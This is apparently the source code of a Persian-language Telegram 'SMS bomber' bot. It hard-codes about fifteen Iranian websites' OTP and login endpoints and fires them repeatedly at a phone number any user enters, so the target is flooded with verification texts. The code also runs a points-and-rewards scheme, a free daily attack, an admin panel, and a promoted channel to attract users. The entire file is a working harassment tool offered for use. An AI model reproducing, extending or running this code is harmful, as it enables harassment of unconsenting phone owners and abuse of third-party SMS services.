// ==================== تنظیمات ====================
const ADMIN_ID = 6887901539; // آیدی عددی ادمین

// ==================== سرویس‌های بمبر ====================
const SERVICES = {
  divar: (p) => fetch('https://api.divar.ir/v5/auth/authenticate', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone: p.replace('+98', '0')}) }),
  sheypoor: (p) => fetch('https://www.sheypoor.com/api/v1/auth/otp/request', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone: p.replace('+98', '0')}) }),
  digikala: (p) => fetch('https://api.digikala.com/v1/user/otp/', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({username: p.replace('+98', '0')}) }),
  snapp: (p) => fetch('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cellphone: p}) }),
  tapsi: (p) => fetch('https://api.tapsi.ir/api/v2.2/user', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({credential: {phoneNumber: p.replace('+98', '0'), role: 'PASSENGER'}, otpOption: 'SMS'}) }),
  alibaba: (p) => fetch('https://ws.alibaba.ir/api/v3/account/mobile/otp', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phoneNumber: p.replace('+98', '0')}) }),
  torob: (p) => fetch(`https://api.torob.com/a/phone/send-pin/?phone_number=${p.replace('+98', '0')}`, { method: 'GET' }),
  basalam: (p) => fetch('https://api.basalam.com/user', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({query: "mutation { mobileVerificationCodeRequest(mobile: \"" + p.replace('+98', '0') + "\") { success } }"}) }),
  digikala_jet: (p) => fetch('https://api.digikalajet.ir/user/login-register/', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone: p.replace('+98', '0')}) }),
  mobit: (p) => fetch('https://api.mobit.ir/api/web/v8/register/register', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({number: p.replace('+98', '0')}) }),
  ghabzino: (p) => fetch('https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({Parameters: {MobileNumber: p.replace('+98', '0')}}) }),
  namava: (p) => fetch('https://www.namava.ir/api/v1.0/accounts/registrations/by-mobile/request', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({UserName: p.replace('+98', '0')}) }),
  idpay: (p) => fetch('https://idpay.ir/api/v1/auth/send-otp', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({mobile: p.replace('+98', '0')}) }),
  snapfood: (p) => fetch('https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cellphone: p.replace('+98', '0')}) }),
  filmnet: (p) => fetch(`https://api-v2.filmnet.ir/access-token/users/${p.replace('+98', '0')}/otp`, { method: 'GET' })
};

// ==================== حافظه موقت ====================
const userStates = new Map();
const userPoints = new Map();
const userDailyReward = new Map();
const userFreeBomb = new Map();

// ==================== توابع کمکی ====================
function normalizePhone(phone) {
  let cleaned = phone.replace(/[^\d+]/g, '');
  if (cleaned.startsWith("09")) return "+98" + cleaned.substring(1);
  if (cleaned.startsWith("9")) return "+98" + cleaned;
  if (cleaned.startsWith("+98")) return cleaned;
  return null;
}

async function sendMessage(token, chatId, text, replyMarkup = null) {
  const payload = { chat_id: chatId, text: text, parse_mode: "Markdown" };
  if (replyMarkup) payload.reply_markup = replyMarkup;
  
  try {
    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
    return await response.json();
  } catch (e) {
    console.error("Send Error:", e);
  }
}

async function editMessage(token, chatId, messageId, text, replyMarkup = null) {
  const payload = { chat_id: chatId, message_id: messageId, text: text, parse_mode: "Markdown" };
  if (replyMarkup) payload.reply_markup = replyMarkup;
  
  try {
    const response = await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
    return await response.json();
  } catch (e) {
    console.error("Edit Error:", e);
  }
}

// ==================== کیپدها (Inline Keyboard تلگرام) ====================
function mainKeypad() {
  return {
    inline_keyboard: [
      [{ text: "💣 شروع عملیات جدید", callback_data: "start_bomb" }],
      [{ text: "🎁 بمبر رایگان", callback_data: "free_bomb" }],
      [{ text: "📊 آمار من", callback_data: "my_stats" }, { text: "⭐ امتیازات من", callback_data: "my_points" }],
      [{ text: "🎁 پاداش روزانه", callback_data: "daily_reward" }],
      [{ text: "📢 کانال ما", callback_data: "channel" }, { text: "❓ راهنما", callback_data: "help" }]
    ]
  };
}

function backKeypad() {
  return {
    inline_keyboard: [[{ text: "↪️ بازگشت به منو", callback_data: "cancel" }]]
  };
}

function roundsKeypad() {
  return {
    inline_keyboard: [
      [{ text: "۱ دور", callback_data: "rounds_1" }, { text: "۲ دور", callback_data: "rounds_2" }, { text: "۳ دور", callback_data: "rounds_3" }],
      [{ text: "↪️ بازگشت", callback_data: "cancel" }]
    ]
  };
}

function adminKeypad() {
  return {
    inline_keyboard: [
      [{ text: "📊 آمار کلی", callback_data: "admin_stats" }],
      [{ text: "👥 کاربران فعال", callback_data: "admin_users" }],
      [{ text: "⭐ افزودن امتیاز", callback_data: "admin_add_points" }],
      [{ text: "↪️ خروج", callback_data: "cancel" }]
    ]
  };
}

// ==================== عملیات بمباران ====================
async function runBombing(token, chatId, messageId, phone, rounds) {
  const serviceKeys = Object.keys(SERVICES);
  let successCount = 0;
  let failCount = 0;
  
  for (let round = 1; round <= rounds; round++) {
    for (let i = 0; i < serviceKeys.length; i++) {
      const serviceName = serviceKeys[i];
      try {
        const response = await SERVICES[serviceName](phone);
        if (response && (response.ok || response.status === 200 || response.status === 201)) {
          successCount++;
        } else {
          failCount++;
        }
      } catch (e) {
        failCount++;
      }
      
      // آپدیت هر 5 درخواست
      if ((successCount + failCount) % 5 === 0) {
        await editMessage(token, chatId, messageId,
          `🎯 در حال بمباران...\n\n` +
          `📱 هدف: \`${phone}\`\n` +
          `🔄 دور: ${round}/${rounds}\n` +
          `✅ موفق: ${successCount}\n` +
          `❌ ناموفق: ${failCount}`
        );
      }
      
      await new Promise(r => setTimeout(r, 50));
    }
  }
  
  await editMessage(token, chatId, messageId,
    `✅ عملیات تمام شد!\n\n` +
    `📱 هدف: \`${phone}\`\n` +
    `🔄 دورها: ${rounds}\n` +
    `✅ موفق: ${successCount}\n` +
    `❌ ناموفق: ${failCount}\n\n` +
    `💫 برای عملیات جدید از منو استفاده کنید`
  );
  
  await sendMessage(token, chatId, "👇 منوی اصلی:", mainKeypad());
}

// ==================== هندلر اصلی ====================
export default {
  async fetch(request, env) {

    if (request.method === "GET") {
      return new Response("🤖 Telegram Bomber Webhook Active ✅");
    }

    if (request.method !== "POST") {
      return new Response("Method Not Allowed", { status: 405 });
    }

    try {
      const update = await request.json();
      
      console.log("===== TELEGRAM UPDATE =====");
      console.log(JSON.stringify(update));
      console.log("=========================");

      // استخراج اطلاعات از ساختار تلگرام
      let chatId = null;
      let text = "";
      let userId = null;
      let buttonId = null;
      let messageId = null;
      let isCallback = false;
      
      // پیام متنی
      if (update.message) {
        chatId = update.message.chat.id;
        text = update.message.text || "";
        userId = update.message.from.id;
        messageId = update.message.message_id;
      }
      
      // کلیک روی دکمه (Callback Query)
      if (update.callback_query) {
        isCallback = true;
        chatId = update.callback_query.message.chat.id;
        buttonId = update.callback_query.data;
        userId = update.callback_query.from.id;
        messageId = update.callback_query.message.message_id;
        
        // باید به تلگرام بگیم که دکمه زده شده (Answer Callback Query)
        await fetch(`https://api.telegram.org/bot${env.TOKEN}/answerCallbackQuery`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ callback_query_id: update.callback_query.id })
        });
      }
      
      console.log("CHAT:", chatId);
      console.log("TEXT:", text);
      console.log("BUTTON:", buttonId);
      console.log("USER:", userId);

      if (!chatId) {
        console.log("❌ chat_id پیدا نشد");
        return new Response("OK");
      }

      const state = userStates.get(chatId) || {};
      const points = userPoints.get(chatId) || 3; // شروع با 3 امتیاز
      const isAdmin = userId === ADMIN_ID;

      // ==================== دکمه‌ها ====================
      
      if (buttonId === "cancel") {
        userStates.delete(chatId);
        await sendMessage(env.TOKEN, chatId, "💣 به منوی اصلی برگشتید!", mainKeypad());
        return new Response("OK");
      }
      
      if (buttonId === "start_bomb") {
        if (points <= 0) {
          await sendMessage(env.TOKEN, chatId, 
            "⚠️ امتیاز کافی ندارید!\n\n" +
            "⭐ امتیاز فعلی: " + points + "\n\n" +
            "🎁 پاداش روزانه بگیرید یا از ادمین امتیاز بخواهید",
            mainKeypad());
          return new Response("OK");
        }
        userStates.set(chatId, { state: "awaiting_phone" });
        await sendMessage(env.TOKEN, chatId, 
          "📞 شماره تلفن هدف را وارد کنید:\n\n" +
          "مثال: `09123456789`",
          backKeypad());
        return new Response("OK");
      }
      
      if (buttonId === "free_bomb") {
        const lastFree = userFreeBomb.get(chatId);
        if (lastFree && Date.now() - lastFree < 24 * 60 * 60 * 1000) {
          const remaining = Math.ceil((24 * 60 * 60 * 1000 - (Date.now() - lastFree)) / (60 * 60 * 1000));
          await sendMessage(env.TOKEN, chatId, 
            "⏳ هنوز 24 ساعت نگذشته!\n\n" +
            "⏰ " + remaining + " ساعت دیگر می‌توانید دوباره استفاده کنید",
            mainKeypad());
          return new Response("OK");
        }
        userStates.set(chatId, { state: "awaiting_free_bomb" });
        await sendMessage(env.TOKEN, chatId, 
          "🎁 بمبر رایگان فعال شد!\n\n" +
          "📞 شماره هدف را وارد کنید:\n" +
          "(1 دور با 5 سرویس تصادفی)",
          backKeypad());
        return new Response("OK");
      }
      
      if (buttonId === "my_stats") {
        await sendMessage(env.TOKEN, chatId,
          "📊 آمار شما\n\n" +
          "🆔 آیدی: `" + chatId + "`\n" +
          "⭐ امتیاز: " + points + "\n" +
          "💣 حملات: " + (state.attacks || 0),
          mainKeypad());
        return new Response("OK");
      }
      
      if (buttonId === "my_points") {
        await sendMessage(env.TOKEN, chatId,
          "⭐ امتیازات شما\n\n" +
          "امتیاز فعلی: " + points + "\n\n" +
          "💡 هر عملیات = 1 امتیاز\n" +
          "🎁 پاداش روزانه = 3 امتیاز",
          mainKeypad());
        return new Response("OK");
      }
      
      if (buttonId === "daily_reward") {
        const lastDaily = userDailyReward.get(chatId);
        if (lastDaily && Date.now() - lastDaily < 24 * 60 * 60 * 1000) {
          const remaining = Math.ceil((24 * 60 * 60 * 1000 - (Date.now() - lastDaily)) / (60 * 60 * 1000));
          await sendMessage(env.TOKEN, chatId, 
            "⏳ هنوز 24 ساعت نگذشته!\n\n" +
            "⏰ " + remaining + " ساعت دیگر",
            mainKeypad());
          return new Response("OK");
        }
        userPoints.set(chatId, points + 3);
        userDailyReward.set(chatId, Date.now());
        await sendMessage(env.TOKEN, chatId, 
          "✅ 3 امتیاز دریافت کردید!\n\n" +
          "⭐ امتیاز فعلی: " + (points + 3),
          mainKeypad());
        return new Response("OK");
      }
      
      if (buttonId === "channel") {
        await sendMessage(env.TOKEN, chatId,
          "📢 کانال ما:\n\n" +
          "@ALI_ARMINEH_COM\n\n" +
          "💬 گپ:\n" +
          "https://rubika.ir/join/BBEGBIJFH0TPJPZVKHBNGAMEOIGJUHPQ",
          mainKeypad());
        return new Response("OK");
      }
      
      if (buttonId === "help") {
        await sendMessage(env.TOKEN, chatId,
          "❓ راهنمای ربات\n\n" +
          "💣 شروع عملیات: بمباران شماره\n" +
          "🎁 بمبر رایگان: هر 24 ساعت\n" +
          "🎁 پاداش روزانه: 3 امتیاز\n" +
          "⭐ امتیازات: مشاهده امتیاز\n\n" +
          "💡 هر عملیات 1 امتیاز مصرف می‌کند",
          mainKeypad());
        return new Response("OK");
      }
      
      // دکمه‌های دور
      if (buttonId && buttonId.startsWith("rounds_")) {
        const rounds = parseInt(buttonId.split('_')[1]);
        const phone = state.phone;
        
        if (!phone) {
          await sendMessage(env.TOKEN, chatId, "❌ خطا! دوباره شروع کنید", mainKeypad());
          return new Response("OK");
        }
        
        // کسر امتیاز
        const currentPoints = userPoints.get(chatId) || 0;
        if (currentPoints <= 0) {
          await sendMessage(env.TOKEN, chatId, "⚠️ امتیاز کافی ندارید!", mainKeypad());
          return new Response("OK");
        }
        userPoints.set(chatId, currentPoints - 1);
        
        // آپدیت آمار
        state.attacks = (state.attacks || 0) + 1;
        userStates.set(chatId, state);
        
        // ارسال پیام اولیه
        const result = await sendMessage(env.TOKEN, chatId, 
          "⏳ در حال آماده‌سازی...\n\n" +
          "📱 هدف: `" + phone + "`\n" +
          "🔄 دور: 1/" + rounds
        );
        
        const msgId = result?.result?.message_id || messageId;
        
        // شروع بمباران در پس‌زمینه
        // چون Worker محدودیت زمانی دارد، فقط 1 دور اجرا می‌کنیم
        // برای دورهای بیشتر باید از Queue استفاده کرد
        
        // اجرای واقعی بمباران (محدود به 1 دور برای جلوگیری از تایم‌اوت)
        const serviceKeys = Object.keys(SERVICES);
        let successCount = 0;
        let failCount = 0;
        
        for (const serviceName of serviceKeys) {
           try {
             const response = await SERVICES[serviceName](phone);
             if (response && (response.ok || response.status === 200 || response.status === 201)) {
               successCount++;
             } else {
               failCount++;
             }
           } catch (e) {
             failCount++;
           }
        }
        
        if (msgId) {
          await editMessage(env.TOKEN, chatId, msgId,
            `✅ عملیات تمام شد!\n\n` +
            `📱 هدف: \`${phone}\`\n` +
            `🔄 دورها: 1 (محدودیت ورکر)\n` +
            `✅ موفق: ${successCount}\n` +
            `❌ ناموفق: ${failCount}\n\n` +
            `💫 برای عملیات جدید از منو استفاده کنید`
          );
        }
        
        await sendMessage(env.TOKEN, chatId, "👇 منوی اصلی:", mainKeypad());
        return new Response("OK");
      }
      
      // ==================== پنل ادمین ====================
      
      if (text === "/admin" && isAdmin) {
        userStates.set(chatId, { state: "admin" });
        await sendMessage(env.TOKEN, chatId, 
          "👑 پنل مدیریت\n\n" +
          "👤 ادمین: " + userId,
          adminKeypad());
        return new Response("OK");
      }
      
      if (buttonId === "admin_stats") {
        await sendMessage(env.TOKEN, chatId,
          "📊 آمار کلی\n\n" +
          "👥 کاربران فعال: " + userStates.size + "\n" +
          "⭐ مجموع امتیازات: " + Array.from(userPoints.values()).reduce((a,b) => a+b, 0) + "\n" +
          "⚔️ سرویس‌ها: " + Object.keys(SERVICES).length,
          adminKeypad());
        return new Response("OK");
      }
      
      if (buttonId === "admin_users") {
        let textMsg = "👥 کاربران:\n\n";
        let count = 0;
        for (const [uid, pts] of userPoints.entries()) {
          if (count++ >= 10) break;
          textMsg += "• `" + uid + "` | ⭐" + pts + "\n";
        }
        await sendMessage(env.TOKEN, chatId, textMsg || "هیچ کاربری نیست", adminKeypad());
        return new Response("OK");
      }
      
      if (buttonId === "admin_add_points") {
        userStates.set(chatId, { state: "add_points" });
        await sendMessage(env.TOKEN, chatId, 
          "⭐ فرمت:\n`chat_id|amount`\n\n" +
          "مثال:\n`6887901539|10`",
          backKeypad());
        return new Response("OK");
      }
      
      // ==================== /start ====================
      
      if (text.trim() === "/start") {
        userStates.delete(chatId);
        await sendMessage(env.TOKEN, chatId,
          "🎉 سلام!\n\n" +
          "🤖 به ربات Bomber خوش آمدید!\n\n" +
          "⭐ امتیاز فعلی: " + points + "\n\n" +
          "💣 برای شروع از منوی زیر استفاده کنید:",
          mainKeypad());
        return new Response("OK");
      }
      
      // ==================== ورودی‌های متنی ====================
      
      // دریافت شماره برای بمباران
      if (state.state === "awaiting_phone") {
        const phone = normalizePhone(text);
        if (!phone) {
          await sendMessage(env.TOKEN, chatId, 
            "❌ شماره نامعتبر!\n\n" +
            "مثال: `09123456789`",
            backKeypad());
          return new Response("OK");
        }
        userStates.set(chatId, { ...state, state: "awaiting_rounds", phone: phone });
        await sendMessage(env.TOKEN, chatId,
          "✅ شماره تایید شد: `" + phone + "`\n\n" +
          "🔄 تعداد دور را انتخاب کنید:",
          roundsKeypad());
        return new Response("OK");
      }
      
      // دریافت شماره برای بمبر رایگان
      if (state.state === "awaiting_free_bomb") {
        const phone = normalizePhone(text);
        if (!phone) {
          await sendMessage(env.TOKEN, chatId, "❌ شماره نامعتبر!", backKeypad());
          return new Response("OK");
        }
        
        userFreeBomb.set(chatId, Date.now());
        userStates.delete(chatId);
        
        const result = await sendMessage(env.TOKEN, chatId, 
          "🎯 شروع بمبر رایگان...\n\n" +
          "📱 هدف: `" + phone + "`"
        );
        
        const msgId = result?.result?.message_id;
        
        // اجرای بمباران رایگان
        const serviceKeys = Object.keys(SERVICES);
        const selectedServices = serviceKeys.sort(() => 0.5 - Math.random()).slice(0, 5);
        
        let successCount = 0;
        let failCount = 0;
        
        for (const serviceName of selectedServices) {
          try {
            const response = await SERVICES[serviceName](phone);
            if (response && (response.ok || response.status === 200 || response.status === 201)) {
              successCount++;
            } else {
              failCount++;
            }
          } catch (e) {
            failCount++;
          }
        }
        
        if (msgId) {
          await editMessage(env.TOKEN, chatId, msgId,
            "✅ بمبر رایگان تمام شد!\n\n" +
            "📱 هدف: `" + phone + "`\n" +
            "✅ موفق: " + successCount + "\n" +
            "❌ ناموفق: " + failCount
          );
        }
        
        await sendMessage(env.TOKEN, chatId, "👇 منوی اصلی:", mainKeypad());
        return new Response("OK");
      }
      
      // افزودن امتیاز (ادمین)
      if (state.state === "add_points" && isAdmin) {
        const parts = text.split('|');
        if (parts.length === 2) {
          const targetId = parseInt(parts[0].trim());
          const amount = parseInt(parts[1].trim());
          if (!isNaN(amount) && !isNaN(targetId)) {
            const current = userPoints.get(targetId) || 0;
            userPoints.set(targetId, current + amount);
            await sendMessage(env.TOKEN, chatId,
              "✅ " + amount + " امتیاز به `" + targetId + "` اضافه شد\n\n" +
              "⭐ امتیاز جدید: " + (current + amount),
              adminKeypad());
            userStates.delete(chatId);
            return new Response("OK");
          }
        }
        await sendMessage(env.TOKEN, chatId, "❌ فرمت اشتباه!", backKeypad());
        return new Response("OK");
      }
      
      // پیام پیش‌فرض
      await sendMessage(env.TOKEN, chatId, 
        "❓ دستور نامفهوم\n\n" +
        "از منوی زیر استفاده کنید:",
        mainKeypad());
      
      return new Response("OK");

    } catch (error) {
      console.error("❌ ERROR:", error);
      return new Response("Error: " + error.message, { status: 500 });
    }
  }
};
